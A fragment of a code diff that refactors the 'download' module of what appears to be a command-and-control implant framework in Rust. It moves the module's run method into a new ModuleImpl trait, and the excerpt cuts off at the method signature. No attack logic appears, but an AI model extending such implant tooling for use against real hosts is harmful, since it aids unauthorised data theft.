@@ -1,4 +1,4 @@
-use crate::{check_field, check_request, Module, Result, TaskResult};
+use crate::{check_field, check_request, Module, ModuleImpl, Result, TaskResult};
 use async_trait::async_trait;
 use malefic_helper::common::filesys::check_sum;
 use malefic_helper::{debug, to_error};
@@ -7,12 +7,16 @@ use malefic_proto::proto::implantpb::{spite::Body};
 use malefic_trait::module_impl;
 use std::fs::{metadata, OpenOptions};
 use std::io::Read;
+use futures::SinkExt;
 
 pub struct Download {}
 
 #[async_trait]
 #[module_impl("download")]
-impl Module for Download {
+impl Module for Download {}
+
+#[async_trait]
+impl ModuleImpl for Download {
     async fn run(
         &mut self,
         id: u32,
